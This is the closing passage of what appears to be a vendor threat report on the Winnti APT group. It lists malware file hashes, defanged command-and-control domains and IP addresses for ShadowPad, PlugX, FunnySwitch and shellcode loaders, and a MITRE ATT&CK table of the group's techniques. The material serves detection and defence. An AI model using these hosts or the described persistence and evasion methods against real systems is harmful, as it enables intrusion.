fbc56623dd4cdfdc917a9bb0fbe00fa213c656069c7094fe90ba2c355f580670
69b961af528eac458942dc1787f32dc432a328d9
2902f54dbd1f143784dfcb170dfc170d


fb0fdd18922977263f78becdedddab7a03c8de16a5431c7b4602e5be13110fa3
6e3d0537cd52965e52b06b984155191c41fe0a18
30684061b51971698984b531205429ca


b45baac2ae9c5fdfbf56131451962826a95d56f641af8ca1b74738c2eb939a76
4f0402e2638831d6259a366cf605eadb8c7fd478
5fcf6562217dd1bb21003a9613739aff


ff0527ea2f8545c86b8dfdef624362ed9e6c09d3f8589f873b1e08a895ef9635
ed8cc92b5a04620b01fcc4365e8f2ffe0c49eb30
f5b3106f2ff44bf860d077e77a1992e3


931ea6a2fc0d5b4c5c3cf2cba596a97eaa805981414c9cda4b26c8c47bf914df
ebb08480d3d94d6d3a8d85894d297db996d57b4f
b6953b1d1c78770a6d4b3e0c9d146d9b


568298593d406bd49de42688365fdc16f4a5841198583527a35f6a7d518a6b0e
425e6c8e89f45a8fe57a27d1eacdc850b2286099
bbeca57f7993a34e6296c8dedb996b76




ShadowPad




03b7b511716c074e9f6ef37318638337fd7449897be999505d4a3219572829b4
147529e1a8b00a62fa2371600988b17487260448
a26d2c6f7df4b74b56f9376a2d234661


5a151aa75fbfc144cb48595a86e7b0ae0ad18d2630192773ff688ae1f42989b7
ea43dbef69af12404549bc45fda756bfefcb3d88
493698b1d7acfbf57848b964b4b0ae97


3b70be53fd7421d77f14041046f7484862e63a33ec4b82590d032804b1565d0d
ebcb044373550b787553a9b9cd297f4b8c330cd3
652c44a6b5d09bf4c749a4b4d1bae895


ae000f5cef11468dde774696423ca0186b46e55781a4232f22760a0bfbfb04f0
ee4744c4e74aa9933f3a5c340d9b739f8399b7f2
4001d217c9a77d5839fbc033937f7ed4


5f1a21940be9f78a5782879ad54600bd67bfcd4d32085db7a3e8a88292db26cc
f6f6f352fa58d587c644953e4fd1552278827e14
52c28bdb6b1fc4d77b1ea58dc8c1c810


e93a9e59ee2c1a18cee75eedcbe968ed552d5c62ec6546c8a1c1f1ae2019844e
1a654b4191a3196353801d37a1de21535eb7a41c
eb763c30f69c4f438be7545e2a1ca76c


1f64194a4e4babe3f176666ffd8ee0d76d856825c19bfcd783aec1bacb74fd05
801b756019c075ef6a20c8219157fe8f92deebc1
791f92ce878c8327337eb8e35675a715


531e54c055838f281d19fed674dbc339c13e21c71b6641c23d8333f6277f28c0
6966687463365f08cfb25fd2c47c6e9a27af22b0
4ad23aae3409c31d3d72e1d10e9d957d


a1fa8cad75c5d999f1b0678fa611009572abf03dd5a836f8f2604108b503b6d2
c1af22e0d0585f6c6a2deab22a784717ee33f36d
882a60c3173e252469eb4731af3342bd


37be65842e3fc72a5ceccdc3d7784a96d3ca6c693d84ed99501f303637f9301a
05a2b848965d77fa154ca24fa438b8e5390c21f5
e542c6fabe80af604d31ef8eaaf94053




PlugX




94ea23e7f53cb9111dd61fe1a1cbb79b8bbabd2d37ed6bfa67ba2a437cfd5e92
14c1e3dd30ef1e22e6ebadd65fb883d3e0354d47
329ecc81b222a796f46859d16bd4813c


ac5b4378a907949c4edd2b2ca7734173875527e9e8d5b6d69af5aea4b8ed3a69
2293a7510101ccfd83db4bd6429db2f9d406859a
d55e9a302203c8800ca89b757b0588ed


e54b7d31a8dd0fbab1fa81081e54b0b9b07634c13934adaf08b23d2b6a84b89a
c40acafac6c1c3ba1d1cf5497bfaf5f682f9884a
a7542a2dc4dd52bd4c9b08741dc32ad7


b59a37f408fcfb8b8e7e001e875629998a570f4a5f652bcbb533ab4d30f243f7
d1cf03da461f81822287465be5942931ac29737d
d3ef032a67242789316e364f7e798ff4


ccdb8e0162796efe19128c0bac78478fd1ff2dc3382aed0c19b0f4bd99a31efc
22bac40e845ec6551396b77e6257f50634993883
7affcfb9857cc14dcc07fb8d226f03e0


4dad1e908604c2faa4ad9d9ef3dcebc3a163e97398d41e5e398788fe8da2305b
7cbaa1757bafa3a6be0793b959feac1ea73d88ff
f749aa99a08fdc737f90813f174abb30


4a89a4d9fa22f42c6d3e51cf8dca0881e34763fe0448b783599bfc00984fd2ee
bd31d8bad119b9da702889b44854b054f15e2f47
4489d5077c5d2396e3a94d652adae1ca


18a14cec1abcb9c02c1094271d89f428dec1896924a949ed760d38cd0dea7217
a2e88dfb93c23ba7cd38a820b2e64f14192079c2
8d6737d573ef70b47fd39a4c5a552e0f




Network Indicators
LNK file attacks
www.comcleanner[.]info
45.76.6[.]149
http://zeplin.atwebpages[.]com/inter.php
http://goodhk.azurewebsites[.]net/inter.php
http://sixindent.epizy[.]com/inter.php
Shellcode injectors
6q4qp9trwi.dnslookup[.]services
d89o0gm34t.livehost[.]live
d89o0gm35t.livehost[.]live
168.106.1[.]1
149.28.152[.]196
207.148.99[.]56
149.28.84[.]98
Shellcode loaders
exchange.dumb1[.]com
microsoftbooks.dynamic-dns[.]net
microsoftdocs.dns05[.]com
ns.microsoftdocs.dns05[.]com
ns1.dns-dropbox[.]com
ns2.dns-dropbox[.]com
ns1.microsoftsonline[.]net
ns2.microsoftsonline[.]net
ns3.mlcrosoft[.]site
onenote.dns05[.]com
service.dns22[.]ml
update.facebookdocs[.]com
104.224.169[.]214
107.182.24[.]70
107.182.24[.]70
149.248.8[.]134
149.28.23[.]32
176.122.162[.]149
45.76.75[.]219
66.42.103[.]222
66.42.107[.]133
66.42.48[.]186
66.98.126[.]203
FunnySwitch
7hln9yr3y6.symantecupd[.]com
db311secsd.kasprsky[.]info
doc.goog1eweb[.]com
ShadowPad
cigy2jft92.kasprsky[.]info
update.ilastname[.]com
PlugX
ns.mircosoftbox[.]com
ns.upgradsource[.]com
update.upgradsource[.]com
103.79.76[.]205
107.174.45[.]134
10.3 MITRE




ID
Name
Description




Reconnaissance




T1593.001
Search Open Websites/Domains: Social Media
Winnti uses a Twitter account to get game-related information


T1594
Search Victim-Owned Websites
Winnti finds the site of a gaming company and uses information from it to create bait


Resource Development




T1583.001
Acquire Infrastructure: Domains
Winnti purchases domain names that resemble those of legitimate services, including the victim's site


T1583.006
Acquire Infrastructure: Web Services
Winnti can use GitHub and Google Docs for C2 updates


T1587.001
Develop Capabilities: Malware
Winnti uses self-developed malware in its attacks


T1587.003
Develop Capabilities: Digital Certificates
Winnti creates self-signed certificates for use in HTTPS C2 traffic


T1588.001
Obtain Capabilities: Malware
Winnti uses PlugX in its attacks


T1588.002
Obtain Capabilities: Tool
Winnti uses Metasploit and Cobalt Strike in its attacks


T1588.003
Obtain Capabilities: Code Signing Certificates
Winnti steals code signing certificates from compromised organizations


T1588.005
Obtain Capabilities: Exploits
Winnti uses a public exploit for remote code execution (RCE) by means of a CHM file


Initial Access




T1566.001
Phishing: Spearphishing Attachment
Winnti sends phishing messages with malicious attachments


T1566.002
Phishing: Spearphishing Link
Winnti sends phishing messages with malicious links


Execution




T1059.003
Command and Scripting Interpreter: Windows Command Shell
Winnti uses cmd.exe and .bat files to run commands


T1059.005
Command and Scripting Interpreter: Visual Basic
Winnti uses VBS files to pass control to subsequent malware stages


T1059.007
Command and Scripting Interpreter: JavaScript/JScript
Winnti uses malicious JScript code in intermediate stages and for the payload


T1203
Exploitation for Client Execution
Winnti exploits RCE in a CHM file by means of an ActiveX object


T1106
Native API
Winnti uses various WinAPI functions to run malicious shellcode in the current process or to inject it into another process


T1204.002
User Execution: Malicious File
Winnti tries to make users run malicious .lnk, .chm, and .exe files


Persistence




T1547.001
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Winnti persists by means of a registry run key or a startup folder


T1543.003
Create or Modify System Process: Windows Service
Winnti persists on infected machines by creating new services


T1053.005
Scheduled Task/Job: Scheduled Task
Winnti creates a task with schtasks for persistence


Defense evasion




T1140
Deobfuscate/Decode Files or Information
To store shellcode with the payload, Winnti uses a custom PL format with encryption


T1574.002
Hijack Execution Flow: DLL Side-Loading
Winnti uses legitimate utilities to load DLLs from ShadowPad and PlugX


T1562.004
Impair Defenses: Disable or Modify System Firewall
FunnySwitch adds allow rules to Windows Firewall for C2 connections


T1070
Indicator Removal on Host
Paranoid PlugX deletes artifacts created during infection from the file system and registry


T1202
Indirect Command Execution
Winnti uses intermediate VBS scripts to run .bat files


T1027.002
Obfuscated Files or Information: Software Packing
Winnti can use VMProtect or custom packers for its malware


T1055.002
Process Injection: Portable Executable Injection
Winnti injects shellcode into the processes explorer.exe, winlogon.exe, wmplayer.exe, svchost.exe, and spoolsv.exe


T1218.001
Signed Binary Proxy Execution: Compiled HTML File
Winnti uses CHM files containing malicious code


T1218.004
Signed Binary Proxy Execution: InstallUtil
Paranoid PlugX can use InstallUtil to run a malicious .NET assembly


T1553.002
Subvert Trust Controls: Code Signing
Winnti uses stolen certificates to sign its malware


Discovery




T1082
System Information Discovery
Winnti backdoors collect information about the computer name and OS version and whether it is 32-bit or 64-bit


T1016
System Network Configuration Discovery
Winnti backdoors collect information about the IP and MAC addresses of the infected machine


T1033
System Owner/User Discovery
Winnti backdoors collect information about the name of the current user


Collection




T1119
Automated Collection
Winnti backdoors automatically collect information about the infected machine


Command and Control




T1071.001
Application Layer Protocol: Web Protocols
Winnti backdoors can use HTTP/HTTPS for C2 connections


T1132.001
Data Encoding: Standard Encoding
Winnti uses GZip for compressing FunnySwitch data


T1001.003
Data Obfuscation: Protocol Impersonation
Winnti uses FakeTLS in Crosswalk traffic


T1573.001
Encrypted Channel: Symmetric Cryptography
Winnti uses AES for encrypting traffic in its backdoors


T1008
Fallback Channels
The Winnti configuration supports indicating multiple C2 servers of various types


T1095
Non-Application Layer Protocol
Winnti backdoors can use TCP and UDP for C2 connections


T1090.001
Proxy: Internal Proxy
FunnySwitch can establish C2 connections via a peer-to-peer network of infected hosts


T1090.002
Proxy: External Proxy
Winnti backdoors support C2 connections via an external HTTP/SOCKS proxy


T1102.001
Web Service: Dead Drop Resolver
Winnti uses Google Docs for updating the C2 address in PlugX




 




Related articles




September 30, 2021
Masters of Mimicry: new APT group ChamelGang and its arsenal


September 29, 2020
ShadowPad: new activity from the Winnti group


October 25, 2023
A pirated program downloaded from a torrent site infected hundreds of thousands of users














Share:








Link copied





Related articles





July 24, 2023
Space Pirates: a look into the group's unconventional techniques, new attack vectors, and tools





May 17, 2022
Space Pirates: analyzing the tools and connections of a new hacker group





June 4, 2020
COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group




All articles
















Solutions



ICS/SCADA
Vulnerability Management
Financial Services
Protection from targeted attacks (anti-apt)
PT Industrial Cybersecurity Suite 
Utilities
ERP Security
Security Compliance



Products



MaxPatrol 8
MaxPatrol SIEM
PT Application Firewall
PT Application Inspector
PT ISIM
PT Network Attack Discovery
PT Sandbox
XSpider
MaxPatrol VM
MaxPatrol SIEM All-in-One
PT MultiScanner
PT BlackBox



Services



ICS/SCADA Security Assessment
ATM Security Assessments
Web Application Security Services
Mobile Application Security Services
Custom Application Security Services
Penetration Testing
Forensic Services
Advanced Border Control



Analytics



Threatscape
PT ESC Threat Intelligence
Cybersecurity glossary
Knowledge base



Partners




About



Clients
Press
News
Events
Contacts
Documents and Materials









                        Copyright © 2002—2024 Positive Technologies. All Rights Reserved.
                    






Report a vulnerability
Help Portal
Terms of Use
Privacy Notice
Cookie Notice
Positive Coordinated Vulnerability Disclosure Policy
Sitemap


Copyright © 2002—2024 Positive Technologies. All Rights Reserved.




Report a vulnerability
Help Portal
Terms of Use
Privacy Notice
Cookie Notice
Positive Coordinated Vulnerability Disclosure Policy
Sitemap
















